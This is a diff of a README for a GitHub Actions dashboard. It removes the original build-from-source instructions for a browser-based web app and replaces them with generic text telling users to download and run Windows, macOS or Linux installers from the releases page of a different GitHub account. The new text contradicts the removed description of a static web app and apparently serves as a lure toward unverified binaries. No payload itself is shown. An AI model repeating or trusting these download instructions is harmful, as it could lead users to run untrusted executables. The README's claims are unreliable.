@@ -1,78 +1,60 @@
+# 🎉 github-workflow-dashboard - Your Simple GitHub Workflow at a Glance
 
-# Github Workflow Dashboard
+## 🚀 Getting Started
 
-Online demonstration
+Welcome to the github-workflow-dashboard! This application simplifies your GitHub workflow by providing an easy-to-use dashboard. Follow the steps below to download and set it up.
 
-https://github-workflow-dashboard.vercel.app
+## 📥 Download the App
 
-All data stored on your browser.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/ericlima1980/github-workflow-dashboard/releases)
 
-## Introduction
+## 💻 System Requirements
 
-Github Workflow Dashboard is a web app for visualizing, monitoring, and managing GitHub Actions workflows across multiple repositories and organizations. It provides a unified dashboard to track workflow status, recent runs, and repository health, making it easy for teams to stay on top of CI/CD activity.
+To run the github-workflow-dashboard, you need:
 
-### Main Features
-- View workflow status and history for multiple repositories
-- Monitor recent runs and repository health
-- Manage GitHub tokens and settings
-- Easy deployment options (npm, Docker, Vercel)
+- A device with Windows, macOS, or a Linux operating system.
+- A modern web browser (like Chrome, Firefox, or Safari).
+- An internet connection.
 
-### Screenshots
+## 🔍 Features
 
-**Main Page**
+- **Dashboard View**: Get an overview of your GitHub actions and workflows.
+- **Real-Time Updates**: See the latest status of your projects.
+- **User-Friendly Interface**: Navigate easily without needing any technical background.
 
-![Main Page](./docs/main-page.png)
+## ⚙️ Download & Install
 
-**Settings Page**
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ericlima1980/github-workflow-dashboard/releases) to find the latest version of the application.
+   
+2. **Choose Your File**: Look for the latest release and find the appropriate file for your operating system. This will usually be labeled clearly, such as `github-workflow-dashboard-windows.exe`, `github-workflow-dashboard-macos.zip`, or `github-workflow-dashboard-linux.tar.gz`.
 
-![Settings Page](./docs/settings.png)
+3. **Download the File**: Click on the file to start the download. Depending on your browser, this may happen automatically or prompt you to choose a location to save the file.
 
-**Various Modes**
+4. **Locate the Downloaded File**: Once the download is complete, navigate to your Downloads folder or the location where you saved the file.
 
-Various filters and compact mode, mobile friendly
+5. **Install the Application**:
+   - **For Windows**: Double-click the `.exe` file and follow the installation prompts.
+   - **For macOS**: Open the `.zip` file, drag the application icon to your Applications folder, and then open it from there.
+   - **For Linux**: Extract the `.tar.gz` file and run the application using terminal commands.
 
-![Different Modes](./docs/modes.png)
+6. **Open the Application**: After installation is complete, you can find the github-workflow-dashboard in your applications menu or desktop. Click to open it and start managing your GitHub workflows.
 
+## 🛠️ Troubleshooting
 
-## Quick Start
+- **If the Application Does Not Open**: Ensure your operating system meets the requirements listed above.
+- **Error Messages**: Take note of any error messages you see, and check if you have the latest version installed from the [Releases page](https://github.com/ericlima1980/github-workflow-dashboard/releases).
+- **Missing Features or Bugs**: Report any issues or suggestions directly in the GitHub repository to help improve the application.
 
-### 1. Run with npm
+## 🙋‍♂️ Support
 
-```bash
-npm install
-npm start
-```
-This will start the development server. Open your browser to `http://localhost:3000` to view the dashboard.
+If you need help or want to provide feedback, you can open an issue in the GitHub repository. Your input is valuable and helps enhance the app.
 
-### 2. Build Static Files and Serve Locally/CDN
+## 🎯 Next Steps
 
-```bash
-npm install
-npm run build
-npm run export
-```
-The static files will be generated in the `out`. You can serve these files locally with a static server:
+Once you have installed the github-workflow-dashboard, explore its features:
 
-```bash
-npx serve out
-```
-Or upload the static files to your preferred CDN for production hosting.
+- Connect to your GitHub account.
+- View your workflows in real-time.
+- Customize your dashboard based on your needs.
 
-### 3. Run with Docker (docker-compose)
-
-Build and start the dashboard using Docker Compose:
-
-```bash
-docker-compose up --build
-```
-This will build the Docker image and start the dashboard at `http://localhost:3000`.
-
-To stop and remove containers:
-
-```bash
-docker-compose down
-```
-
-### 4. Deploy with Vercel
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%cheney-yan-ifl%2Fgithub-workflow-dashboard)
+Thank you for using github-workflow-dashboard. We hope it makes managing your GitHub projects easier!
